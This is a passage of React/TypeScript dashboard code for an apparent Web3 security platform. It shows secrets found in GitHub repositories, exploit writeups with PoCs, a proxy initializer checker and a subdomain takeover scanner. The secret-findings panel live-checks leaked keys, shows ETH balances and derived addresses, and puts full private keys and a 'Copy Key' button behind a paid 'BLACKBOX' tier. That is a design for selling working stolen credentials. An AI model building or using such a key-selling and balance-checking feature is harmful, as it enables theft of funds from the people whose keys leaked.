                sub: isRu ? `Радар: ${fmt(result.db_stats?.radar_total ?? 0, 0)} репо` : `Radar: ${fmt(result.db_stats?.radar_total ?? 0, 0)} repos`,
              },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
                {c.sub && <p className="mt-0.5 font-mono text-[10px] text-muted-foreground">{c.sub}</p>}
              </div>
            ))}
          </div>

          <div className="rounded-xl border border-border bg-card p-5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
              <p className="font-mono text-[11px] uppercase tracking-wider text-primary font-bold">
                🔐 {isRu ? "OSPEC — Сгруппированные находки по репозиториям (L2.5 Filtered)" : "OSPEC — Grouped Secret Findings by Repository (L2.5 Filtered)"}
              </p>
              <div className="flex flex-wrap items-center gap-2 font-mono text-[11px] text-muted-foreground">
                <span>
                  Mode: <b className="text-foreground">{result.filter_mode}</b> ·{" "}
                  <b className="text-foreground">{fmt(result.total_groups ?? result.findings_returned, 0)}</b> groups
                </span>
                {Number(result.total_groups || 0) > Number(result.limit || 15) && (
                  <div className="flex items-center gap-1 ml-2">
                    <button
                      type="button"
                      disabled={ospecOffset <= 0 || loading}
                      onClick={() => {
                        const step = Number(result.limit || 15);
                        runOspecWithFilters({ offset: Math.max(0, ospecOffset - step) });
                      }}
                      className="rounded border border-border bg-background px-2 py-0.5 text-[10px] font-semibold text-foreground hover:border-primary disabled:opacity-40"
                    >
                      ⬅️ {isRu ? "Назад" : "Prev"}
                    </button>
                    <span className="px-1.5 text-[10px] text-foreground">
                      {Math.floor(ospecOffset / Number(result.limit || 15)) + 1} /{" "}
                      {Math.max(1, Math.ceil(Number(result.total_groups || 1) / Number(result.limit || 15)))}
                    </span>
                    <button
                      type="button"
                      disabled={ospecOffset + Number(result.limit || 15) >= Number(result.total_groups || 0) || loading}
                      onClick={() => {
                        const step = Number(result.limit || 15);
                        runOspecWithFilters({ offset: ospecOffset + step });
                      }}
                      className="rounded border border-border bg-background px-2 py-0.5 text-[10px] font-semibold text-foreground hover:border-primary disabled:opacity-40"
                    >
                      {isRu ? "Вперёд" : "Next"} ➡️
                    </button>
                  </div>
                )}
              </div>
            </div>

            {!result.findings || result.findings.length === 0 ? (
              <p className="font-mono text-xs text-muted-foreground py-4 text-center">
                {isRu ? "📭 Нет находок по выбранному фильтру" : "📭 No findings match the current filter"}
              </p>
            ) : (
              <div className="space-y-2.5 max-h-[540px] overflow-y-auto pr-1">
                {result.findings.map((f: any) => {
                  const isReal = f.cls === "REAL";
                  return (
                    <div
                      key={f.id}
                      className="rounded-xl border border-border bg-background p-3.5 font-mono text-xs transition-colors hover:border-primary/40"
                    >
                      <div className="flex flex-wrap items-center justify-between gap-2">
                        <div className="flex flex-wrap items-center gap-2">
                          <span
                            className={`rounded px-2 py-0.5 text-[10px] font-bold ${
                              f.severity === "CRITICAL"
                                ? "bg-destructive/20 text-destructive border border-destructive/40"
                                : "bg-primary/15 text-primary border border-primary/40"
                            }`}
                          >
                            {f.severity === "CRITICAL" ? "🔴 CRITICAL" : `🟠 ${f.severity}`}
                          </span>
                          <span
                            className={`rounded px-2 py-0.5 text-[10px] font-bold ${
                              isReal
                                ? "bg-green-500/15 text-green-400 border border-green-500/40"
                                : "bg-muted text-muted-foreground"
                            }`}
                          >
                            {isReal ? "🟢 REAL" : `🧪 ${f.cls || "TEST"}`}
                          </span>
                          {f.vertical && (
                            <span
                              className={`rounded border px-2 py-0.5 text-[10px] font-bold uppercase ${
                                f.vertical === "AI_AGENTS"
                                  ? "border-purple-500/40 bg-purple-500/15 text-purple-300"
                                  : f.vertical === "INFRA_CLOUD"
                                  ? "border-cyan-500/40 bg-cyan-500/15 text-cyan-300"
                                  : f.vertical === "STARTUP_SAAS"
                                  ? "border-emerald-500/40 bg-emerald-500/15 text-emerald-300"
                                  : f.vertical === "QUANT_HFT"
                                  ? "border-amber-500/40 bg-amber-500/15 text-amber-300"
                                  : "border-blue-500/40 bg-blue-500/15 text-blue-300"
                              }`}
                            >
                              {f.vertical === "AI_AGENTS"
                                ? "🤖 AI & MCP"
                                : f.vertical === "INFRA_CLOUD"
                                ? "☁️ INFRA"
                                : f.vertical === "STARTUP_SAAS"
                                ? "🚀 STARTUP"
                                : f.vertical === "QUANT_HFT"
                                ? "📈 QUANT/HFT"
                                : "⛓️ WEB3/DEFI"}
                            </span>
                          )}
                          <span className="font-bold text-foreground">
                            {f.kind} <span className="text-primary">×{f.hits}</span>
                          </span>
                          {f.is_live && (
                            <span className="rounded bg-amber-500/20 px-2 py-0.5 text-[10px] font-bold text-amber-400">
                              🔥 LIVE
                            </span>
                          )}
                          {f.balance_eth ? (
                            <span className="rounded bg-green-500/20 px-2 py-0.5 text-[10px] font-bold text-green-400">
                              💰 {f.balance_eth} ETH
                            </span>
                          ) : null}
                          {f.nonce ? (
                            <span className="rounded bg-cyan-500/15 px-2 py-0.5 text-[10px] font-bold text-cyan-400">
                              ⚡ nonce {f.nonce}
                            </span>
                          ) : null}
                        </div>
                        <div className="flex items-center gap-2">
                          {f.found_at && (
                            <span className="text-[10px] text-muted-foreground">{f.found_at}</span>
                          )}
                          {rank >= 2 && (
                            <button
                              type="button"
                              onClick={async () => {
                                try {
                                  setOspecDaemonMsg(isRu ? `🧬 Проверка живости #${f.id} (${f.kind})...` : `🧬 Probing #${f.id} (${f.kind})...`);
                                  const res = await fetch(`${API_BASE}/api/tools/ospec/verify/${f.id}`, {
                                    method: "POST",
                                    headers: { ...authHeaders() },
                                  });
                                  const d = await res.json().catch(() => ({}));
                                  if (!res.ok) throw new Error(d.detail || `HTTP ${res.status}`);
                                  setOspecDaemonMsg(
                                    `🧬 #${f.id} [${d.kind}]: ${d.is_live ? "🔥 LIVE" : "⚪ 0 bal / DEAD"} · ${
                                      d.derived_addr ? `${d.derived_chain?.toUpperCase() || ""} ${d.derived_addr} · ` : ""
                                    }${d.detail || ""}`
                                  );
                                  runOspecWithFilters({ offset: ospecOffset });
                                } catch (e: any) {
                                  setError(e.message);
                                }
                              }}
                              className="inline-flex items-center gap-1 rounded-lg border border-cyan-500/40 bg-cyan-500/10 px-2 py-1 font-mono text-[10px] font-semibold text-cyan-300 transition-colors hover:bg-cyan-500 hover:text-black"
                              title={isRu ? "Проверить баланс / живость ключа" : "Run live balance / API check"}
                            >
                              ⚡ {isRu ? "Live-Чек" : "Verify"}
                            </button>
                          )}
                          <button
                            type="button"
                            onClick={() => handleToggleOspecFinding(f.id)}
                            className="inline-flex items-center gap-1 rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 font-mono text-[10px] font-semibold text-primary transition-colors hover:bg-primary hover:text-primary-foreground"
                          >
                            <Eye size={11} />
                            <span>
                              {loadingFindingId === f.id
                                ? isRu ? "Загрузка…" : "Loading…"
                                : expandedFindingId === f.id
                                ? isRu ? "Скрыть" : "Close"
                                : isRu ? "Открыть" : "Open"}
                            </span>
                          </button>
                        </div>
                      </div>

                      <div className="mt-2 flex flex-wrap items-center justify-between gap-2 text-[11px]">
                        <a
                          href={f.repo_url}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="font-semibold text-primary hover:underline truncate"
                        >
                          📦 {f.ticker || f.repo_url}
                        </a>
                        {f.gh_url ? (
                          <a
                            href={f.gh_url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-muted-foreground hover:text-foreground truncate"
                          >
                            📄 {f.path}{f.line ? `:${f.line}` : ""} ↗
                          </a>
                        ) : (
                          <span className="text-muted-foreground truncate">
                            📄 {f.path}
                          </span>
                        )}
                      </div>

                      {(f.derived_addr || f.secret_masked) && (
                        <div className="mt-2 flex flex-wrap items-center justify-between gap-2 border-t border-border/60 pt-2 text-[11px] text-muted-foreground">
                          {f.derived_addr ? (
                            <span className="flex items-center gap-1.5">
                              <span>
                                🔑 <code className="text-foreground">{f.derived_addr}</code>{" "}
                                {f.derived_chain ? `(${f.derived_chain})` : ""}
                              </span>
                              {rank >= 2 && (
                                <button
                                  type="button"
                                  onClick={() => {
                                    navigator.clipboard.writeText(f.derived_addr || "");
                                    setCopiedSecretId(`addr_${f.id}`);
                                    setTimeout(() => setCopiedSecretId(null), 1500);
                                  }}
                                  className="rounded border border-border px-1.5 py-0.5 text-[10px] hover:border-primary hover:text-primary"
                                >
                                  {copiedSecretId === `addr_${f.id}` ? "✓" : "📋"}
                                </button>
                              )}
                            </span>
                          ) : (
                            <span />
                          )}
                          {f.secret_masked && (
                            <div className="flex flex-wrap items-center gap-2">
                              <span>
                                {rank >= 3 ? (isRu ? "Полный ключ:" : "Full Secret:") : "Preview:"}{" "}
                                <code className="rounded bg-card px-2 py-0.5 text-primary select-all">{f.secret_masked}</code>
                              </span>
                              {rank >= 3 && f.secret_full ? (
                                <button
                                  type="button"
                                  onClick={() => {
                                    navigator.clipboard.writeText(f.secret_full || f.secret_masked || "");
                                    setCopiedSecretId(`sec_${f.id}`);
                                    setTimeout(() => setCopiedSecretId(null), 1500);
                                  }}
                                  className="inline-flex items-center gap-1 rounded border border-primary/50 bg-primary/15 px-2 py-0.5 text-[10px] font-semibold text-primary hover:bg-primary hover:text-primary-foreground"
                                >
                                  {copiedSecretId === `sec_${f.id}` ? <Check size={10} /> : <Copy size={10} />}
                                  <span>{copiedSecretId === `sec_${f.id}` ? (isRu ? "Скопировано" : "Copied") : (isRu ? "Копировать ключ" : "Copy Key")}</span>
                                </button>
                              ) : (
                                <button
                                  type="button"
                                  onClick={() =>
                                    window.dispatchEvent(
                                      new CustomEvent("boris-open-checkout", {
                                        detail: { tier: rank === 1 ? "raw" : "blackbox" },
                                      })
                                    )
                                  }
                                  className="rounded border border-amber-500/50 bg-amber-500/15 px-2 py-0.5 text-[10px] font-bold text-amber-300 hover:bg-amber-500 hover:text-black"
                                >
                                  {rank === 1
                                    ? isRu
                                      ? "⬆️ RAW (маска+путь) / BLACKBOX (полный)"
                                      : "⬆️ Upgrade RAW / BLACKBOX"
                                    : isRu
                                    ? "⬆️ Открыть полный ключ [BLACKBOX]"
                                    : "⬆️ Unlock Full Key [BLACKBOX]"}
                                </button>
                              )}
                            </div>
                          )}
                        </div>
                      )}

                      {expandedFindingId === f.id && findingDetail[f.id] && (
                        <div className="mt-3 rounded-lg border border-primary/30 bg-card p-3 space-y-2">
                          <div className="flex items-center justify-between text-[10px] uppercase tracking-wider text-primary font-bold">
                            <span>
                              {isRu
                                ? `Вхождения в репозиториях (${findingDetail[f.id].occurrences_count})`
                                : `Occurrences across repositories (${findingDetail[f.id].occurrences_count})`}
                            </span>
                            <a
                              href={f.repo_url}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="underline hover:text-foreground"
                            >
                              GitHub Repo ↗
                            </a>
                          </div>
                          <div className="space-y-1.5 max-h-60 overflow-y-auto pr-1">
                            {(findingDetail[f.id].occurrences || []).map((occ: any) => (
                              <div
                                key={occ.id}
                                className="flex flex-wrap items-center justify-between gap-2 rounded border border-border bg-background px-2.5 py-1.5 text-[11px]"
                              >
                                <a
                                  href={occ.gh_url || f.repo_url}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="font-semibold text-foreground hover:text-primary truncate max-w-[260px]"
                                >
                                  📄 {occ.repo_url ? `${occ.repo_url.replace(/^https?:\/\/github\.com\//, "")} · ` : ""}{occ.path}{occ.line ? `:${occ.line}` : ""} ↗
                                </a>
                                <div className="flex items-center gap-2">
                                  {occ.cls && (
                                    <span
                                      className={`rounded px-1.5 py-0.5 text-[9px] font-bold ${
                                        occ.cls === "REAL"
                                          ? "bg-green-500/15 text-green-400"
                                          : "bg-muted text-muted-foreground"
                                      }`}
                                    >
                                      {occ.cls}
                                    </span>
                                  )}
                                  {occ.is_live && (
                                    <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] font-bold text-amber-400">
                                      🔥 LIVE
                                    </span>
                                  )}
                                  <code className="rounded bg-card px-2 py-0.5 text-primary select-all">
                                    {occ.secret_preview}
                                  </code>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      navigator.clipboard.writeText(occ.secret_preview || "");
                                      setCopiedSecretId(String(occ.id));
                                      setTimeout(() => setCopiedSecretId(null), 1500);
                                    }}
                                    className="rounded border border-border p-1 text-muted-foreground hover:border-primary hover:text-primary"
                                    title={isRu ? "Скопировать" : "Copy"}
                                  >
                                    {copiedSecretId === String(occ.id) ? <Check size={11} /> : <Copy size={11} />}
                                  </button>
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      )}

      {/* 9. 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
      {result && tool === "hacks" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">
                {result.mode === "kb_search"
                  ? `KB Query: ${result.query}`
                  : result.target_name && result.target_name !== result.target
                  ? `🏛️ ${result.target_name} (${result.target})`
                  : result.target}
              </span>
              {result.chain && <span className="ml-2 text-muted-foreground">({result.chain})</span>}
            </div>
            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
              {result.verdict} {result.total_pattern_risk !== undefined ? `· Score: ${result.total_pattern_risk}` : ""}
            </span>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">
                {isRu ? "База подробных разборов (PoC)" : "Deep Writeups DB (PoC)"}
              </p>
              <p className="mt-1 text-sm font-bold text-primary">
                {result.total_writeups_db || 1678} writeups
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">DeFiHackLabs Index</p>
              <p className="mt-1 text-sm font-bold text-foreground">
                {result.total_defihacklabs_db || 861} exploits
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">
                {isRu ? "Суммарная база знаний" : "Combined Exploit KB"}
              </p>
              <p className="mt-1 text-sm font-bold text-green-400">
                {result.total_combined_db || result.total_incidents_in_db || 2539} total incidents
              </p>
            </div>
          </div>

          {/* MODE A: Direct Search across 1,678 Deep Writeups */}
          {result.mode === "kb_search" && Array.isArray(result.writeups) && (
            <div className="space-y-3">
              {result.writeups.map((w: any, idx: number) => {
                const wKey = w.slug || w.title || String(idx);
                const isOpen = expandedWriteupSlug === wKey;
                const wData = writeupCache[wKey];
                return (
                  <div key={idx} className="rounded-lg border border-border bg-background p-4 space-y-2">
                    <div className="flex flex-wrap items-start justify-between gap-2">
                      <div>
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                            {w.chain || "EVM"}
                          </span>
                          <span className="text-[10px] text-muted-foreground">{w.date}</span>
                          <span className="font-bold text-sm text-foreground">{w.title}</span>
                        </div>
                        {w.loss && (
                          <p className="mt-1 text-[11px] font-bold text-red-400">
                            💥 Loss: {w.loss}
                          </p>
                        )}
                      </div>
                      <button
                        type="button"
                        onClick={() => handleToggleWriteup(w.slug, w.title)}
                        className="inline-flex items-center gap-1.5 rounded-lg bg-primary px-3 py-1.5 text-[11px] font-semibold text-primary-foreground hover:bg-primary-dim"
                      >
                        <BookOpen size={12} />
                        <span>
                          {loadingWriteupSlug === wKey
                            ? isRu ? "Загрузка…" : "Loading…"
                            : isOpen
                            ? isRu ? "Скрыть разбор" : "Hide Writeup"
                            : isRu ? "Открыть разбор & PoC" : "Open Writeup & PoC"}
                        </span>
                      </button>
                    </div>

                    {w.description && (
                      <p className="text-[11px] text-muted-foreground leading-relaxed">{w.description}</p>
                    )}

                    {Array.isArray(w.tags) && w.tags.length > 0 && (
                      <div className="flex flex-wrap gap-1.5 pt-1">
                        {w.tags.map((tg: string, ti: number) => (
                          <span
                            key={ti}
                            className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground"
                          >
                            {tg}
                          </span>
                        ))}
                      </div>
                    )}

                    {isOpen && wData && (
                      <div className="mt-3 rounded-xl border border-primary/40 bg-card p-4 space-y-2">
                        {wData.error ? (
                          <p className="text-red-400">⚠️ {wData.error}</p>
                        ) : (
                          <>
                            <div className="flex items-center justify-between border-b border-border pb-2">
                              <span className="text-[11px] font-bold text-primary">
                                📄 {wData.file}
                              </span>
                              <button
                                type="button"
                                onClick={() => navigator.clipboard.writeText(wData.markdown || "")}
                                className="rounded border border-border bg-background px-2.5 py-1 text-[10px] text-muted-foreground hover:border-primary hover:text-primary"
                              >
                                {isRu ? "Скопировать весь разбор + PoC" : "Copy Writeup + PoC"}
                              </button>
                            </div>
                            <pre className="max-h-96 overflow-y-auto whitespace-pre-wrap text-[11px] text-foreground leading-relaxed">
                              {wData.markdown}
                            </pre>
                          </>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}

          {/* MODE B: 0x Contract Source Cross-Reference */}
          {result.mode !== "kb_search" && (
            <div className="space-y-3">
              {(result.matched_patterns || []).map((mp: any, idx: number) => (
                <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <div className="flex items-center gap-2">
                      <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
                        Score {mp.score} (hits: {mp.hits})
                      </span>
                      <span className="font-bold text-foreground">{mp.attack_type}</span>
                    </div>
                    <code className="text-[10px] text-muted-foreground">{mp.pattern}</code>
                  </div>
                  <p className="text-[11px] text-muted-foreground">{mp.note}</p>

                  {/* Deep Writeups from the 1,678 DB */}
                  {Array.isArray(mp.deep_writeups) && mp.deep_writeups.length > 0 && (
                    <div className="mt-2 border-t border-border/60 pt-2 space-y-2">
                      <p className="text-[10px] uppercase text-primary font-semibold">
                        {isRu ? "Подробные разборы и Foundry PoC из базы 1,678 взломов:" : "Deep Writeups & Foundry PoCs (1,678 DB):"}
                      </p>
                      {mp.deep_writeups.map((dw: any, di: number) => {
                        const wKey = dw.slug || dw.title || `${idx}_${di}`;
                        const isOpen = expandedWriteupSlug === wKey;
                        const wData = writeupCache[wKey];
                        return (
                          <div key={di} className="rounded border border-border bg-card p-2.5 space-y-1.5">
                            <div className="flex flex-wrap items-center justify-between gap-2">
                              <span className="font-bold text-foreground">{dw.title}</span>
                              <button
                                type="button"
                                onClick={() => handleToggleWriteup(dw.slug, dw.title)}
                                className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-[10px] font-bold text-primary hover:bg-primary hover:text-primary-foreground"
                              >
                                <BookOpen size={11} />
                                <span>{isOpen ? (isRu ? "Скрыть PoC" : "Hide PoC") : isRu ? "Разбор & PoC" : "Writeup & PoC"}</span>
                              </button>
                            </div>
                            {dw.loss && <p className="text-[10px] text-red-400">Loss: {dw.loss}</p>}
                            {isOpen && wData?.markdown && (
                              <pre className="mt-2 max-h-80 overflow-y-auto rounded border border-border bg-background p-3 whitespace-pre-wrap text-[11px] text-foreground">
                                {wData.markdown}
                              </pre>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}

                  {Array.isArray(mp.related_hacks) && mp.related_hacks.length > 0 && (
                    <div className="mt-2 border-t border-border/60 pt-2">
                      <p className="mb-1.5 text-[10px] uppercase text-muted-foreground font-semibold">
                        {isRu ? "Дополнительные инциденты из DeFiHackLabs (861):" : "Additional Precedents (DeFiHackLabs 861):"}
                      </p>
                      <div className="grid grid-cols-1 gap-1.5 sm:grid-cols-2">
                        {mp.related_hacks.map((h: any, hi: number) => (
                          <div key={hi} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                            <span className="font-semibold text-foreground truncate">{h.protocol}</span>
                            <span className="text-red-400 font-bold">{h.lost}</span>
                            <span className="text-[10px] text-muted-foreground">{h.date}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* 10. Proxy & EIP-1967 Upgradeability Inspector */}
      {result && tool === "proxy" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex flex-wrap items-center gap-2">
              {(result.proxy_name || result.impl_name) && (
                <span className="rounded border border-emerald-500/40 bg-emerald-500/15 px-2.5 py-0.5 text-xs font-bold text-emerald-300">
                  🏛️ {result.proxy_name || result.impl_name}
                </span>
              )}
              <span className="text-primary font-bold">{result.address}</span>
              <span className="text-muted-foreground">({result.chain})</span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                result.status === "VULN"
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.status} · {result.is_proxy ? "PROXY DETECTED" : "STANDALONE CONTRACT"}
            </span>
          </div>

          {/* SVG EIP-1967 DELEGATION FLOW DIAGRAM */}
          <div className="rounded-xl border border-border bg-background/70 p-3.5 overflow-x-auto">
            <svg viewBox="0 0 820 96" className="w-full min-w-[600px] h-auto">
              <rect x="16" y="18" width="210" height="60" rx="10" fill="hsl(var(--card))" stroke="hsl(var(--primary))" strokeWidth="1.8" />
              <text x="121" y="42" textAnchor="middle" fill="hsl(var(--primary))" fontSize="10" fontWeight="bold">
                🛡️ PROXY ENTRYPOINT
              </text>
              <text x="121" y="60" textAnchor="middle" fill="hsl(var(--foreground))" fontSize="9.5">
                {String(result.address || "").slice(0, 10)}…{String(result.address || "").slice(-6)}
              </text>

              <path d="M 226 48 L 304 48" stroke="#10b981" strokeWidth="2" strokeDasharray="4 3" />
              <text x="265" y="40" textAnchor="middle" fill="#10b981" fontSize="8.5" fontWeight="bold">
                DELEGATECALL
              </text>

              <rect x="304" y="18" width="230" height="60" rx="10" fill="hsl(var(--card))" stroke="#10b981" strokeWidth="1.8" />
              <text x="419" y="42" textAnchor="middle" fill="#10b981" fontSize="10" fontWeight="bold">
                ⚙️ IMPLEMENTATION LOGIC
              </text>
              <text x="419" y="60" textAnchor="middle" fill="hsl(var(--foreground))" fontSize="9.5">
                {result.eip1967?.implementation
                  ? `${result.eip1967.implementation.slice(0, 10)}…${result.eip1967.implementation.slice(-6)}`
                  : "Standalone / Immutable"}
              </text>

              <path d="M 534 48 L 600 48" stroke="#f59e0b" strokeWidth="1.8" />
              <text x="567" y="40" textAnchor="middle" fill="#f59e0b" fontSize="8.5" fontWeight="bold">
                ADMIN SLOT
              </text>

              <rect x="600" y="18" width="204" height="60" rx="10" fill="hsl(var(--card))" stroke="#f59e0b" strokeWidth="1.8" />
              <text x="702" y="42" textAnchor="middle" fill="#f59e0b" fontSize="10" fontWeight="bold">
                🔑 {result.eip1967?.admin_type || "PROXY ADMIN"}
              </text>
              <text x="702" y="60" textAnchor="middle" fill="hsl(var(--foreground))" fontSize="9.5">
                {result.eip1967?.admin
                  ? `${result.eip1967.admin.slice(0, 10)}…${result.eip1967.admin.slice(-6)}`
                  : "No Admin / Zero"}
              </text>
            </svg>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
            <div className="rounded-lg border border-border bg-background p-3">
              <div className="flex items-center justify-between">
                <p className="text-[10px] uppercase text-muted-foreground">EIP-1967 Implementation</p>
                {result.eip1967?.implementation && (
                  <button
                    type="button"
                    onClick={() => {
                      setTool("flash");
                      setInput1(result.eip1967.implementation);
                    }}
                    className="rounded border border-primary/40 bg-primary/10 px-1.5 py-0.5 text-[9px] font-bold text-primary hover:bg-primary hover:text-primary-foreground"
                  >
                    ⚡ Scan Logic ↗
                  </button>
                )}
              </div>
              <p className="mt-1 truncate font-bold text-foreground select-all">
                {result.eip1967?.implementation || "None (or custom slot)"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Proxy Admin Slot</p>
              <p className="mt-1 truncate font-bold text-primary">
                {result.eip1967?.admin || "None"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">{result.eip1967?.admin_type}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Bytecode Size / Beacon</p>
              <p className="mt-1 font-bold text-foreground">{result.codesize} bytes</p>
              <p className="mt-0.5 truncate text-[10px] text-muted-foreground">
                Beacon: {result.eip1967?.beacon || "—"}
              </p>
            </div>
          </div>

          {(result.targets_checked || []).map((tc: any, idx: number) => (
            <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="font-bold text-foreground">
                  [{tc.target?.toUpperCase()}] {tc.addr}
                </span>
                <div className="flex gap-2 text-[10px]">
                  <span className="rounded border border-border bg-card px-2 py-0.5">
                    upgradeSelector: <b>{tc.has_upgrade ? "YES" : "NO"}</b>
                  </span>
                  <span className="rounded border border-border bg-card px-2 py-0.5">
                    _disableInitializers: <b>{tc.has_disable ? "YES" : "NO"}</b>
                  </span>
                </div>
              </div>
              {Array.isArray(tc.inits) && tc.inits.length > 0 ? (
                <div className="space-y-1.5 pt-1">
                  {tc.inits.map((ini: any, ii: number) => (
                    <div
                      key={ii}
                      className={`flex flex-wrap items-center justify-between gap-2 rounded border px-2.5 py-1.5 text-[11px] ${
                        ini.vulnerable
                          ? "border-red-500/50 bg-red-500/10 text-red-400"
                          : "border-border bg-card text-muted-foreground"
                      }`}
                    >
                      <code className="font-bold text-foreground">{ini.sig} (0x{ini.selector})</code>
                      <span>{ini.reason}</span>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-[11px] text-muted-foreground">
                  {isRu
                    ? "Открытых функций initialize() без аргументов в байткоде/ABI не обнаружено."
                    : "No exposed argumentless initialize() selectors detected."}
                </p>
              )}
            </div>
          ))}
        </div>
      )}

      {/* 11. Web3 Off-Chain Surface Mapper v2.0 (6 Passive OSINT Sources + TLS/RDAP/DNS/WAF/Takeover + Topology Graph) */}
      {result && tool === "surface" && (() => {
        const sRisk = Math.min(100, Math.max(0, Number(result.surface_risk_score ?? 25)));
        const hdrScore = Math.min(100, Math.max(0, Number(result.avg_headers_score ?? 50)));
        const rdap = result.rdap_intel || {};
        const dns = result.dns_posture || {};
        const tls = result.tls_info || {};
        const pSources = result.passive_sources_breakdown || {};
        const takeovers = result.takeover_alerts || [];
        const exposures = result.exposed_files || [];
        const aliveList = result.subdomains_alive || [];

        const rG = 46;
        const cG = 2 * Math.PI * rG;
        const arcG = cG * 0.75;
        const sRiskOffset = arcG - (sRisk / 100) * arcG;

        return (
          <div className="rounded-xl border border-border bg-card p-5 space-y-5 font-mono text-xs">
            {/* Top Banner */}
            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
              <div className="flex flex-wrap items-center gap-2.5">
                <span className="rounded-lg border border-primary/40 bg-primary/15 px-3 py-1 text-xs font-bold text-primary">
                  🛰️ INFRA & SUBDOMAIN SURFACE MAPPER v2.0
                </span>
                <span className="text-base font-black text-foreground">🌐 {result.domain}</span>
                {result.linked_protocol && (
                  <span className="rounded border border-emerald-500/40 bg-emerald-500/15 px-2.5 py-0.5 text-[10px] font-bold text-emerald-400">
                    ✓ {result.linked_protocol.name} {result.linked_protocol.symbol ? `($${result.linked_protocol.symbol})` : ""} · {result.linked_protocol.category}
                  </span>
                )}
              </div>
              <div className="flex flex-wrap items-center gap-2">
                <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-1 text-[11px] font-bold text-primary">
                  Alive Hosts: {result.subdomains_count || 0} / {result.subdomains_probed || 0} probed (Passive OSINT: {result.ct_discovered_count || 0})
                </span>
                <button
                  type="button"
                  onClick={() => {
                    setTool("social");
                    setInput1(result.domain);
                  }}
                  className="rounded-lg border border-cyan-500/40 bg-cyan-500/10 px-2.5 py-1 text-[10px] font-bold text-cyan-300 hover:bg-cyan-500 hover:text-black"
                >
                  🕵️‍♂️ Deep OSINT ({result.domain}) ↗
                </button>
              </div>
            </div>

            {/* CRITICAL TAKEOVER OR EXPOSED CONFIG ALERTS */}
            {(takeovers.length > 0 || exposures.length > 0) && (
              <div className="rounded-xl border border-red-500/60 bg-red-500/10 p-4 space-y-2">
                <p className="text-xs font-bold uppercase text-red-300">
                  🚨 {isRu ? "Обнаружены критические уязвимости периметра (Subdomain Takeover / Exposed Files):" : "Critical Perimeter Vulnerabilities Detected:"}
                </p>
                {takeovers.map((tk: any, ti: number) => (
                  <div key={`tk_${ti}`} className="flex items-center justify-between rounded border border-red-500/40 bg-card px-3 py-2 text-[11px]">
                    <span className="font-bold text-red-300">⚠️ CNAME Subdomain Takeover: {tk.host}</span>
                    <span className="text-foreground">→ {tk.cname} ({tk.provider} · {tk.severity})</span>
                  </div>
                ))}
                {exposures.map((exf: any, ei: number) => (
                  <div key={`ex_${ei}`} className="flex items-center justify-between rounded border border-red-500/40 bg-card px-3 py-2 text-[11px]">
                    <span className="font-bold text-red-300">🔥 {exf.label}</span>
                    <a href={exf.url} target="_blank" rel="noopener noreferrer" className="text-primary underline">{exf.url} ↗</a>
                  </div>
                ))}
              </div>
            )}

            {/* 3-COLUMN HERO TELEMETRY DECK */}
            <div className="grid grid-cols-1 gap-4 lg:grid-cols-12">
              {/* COL 1 (4 cols): SVG Radial Surface Risk + Headers Score + TLS Certificate */}
              <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between space-y-3">
                <div className="flex items-center justify-between">
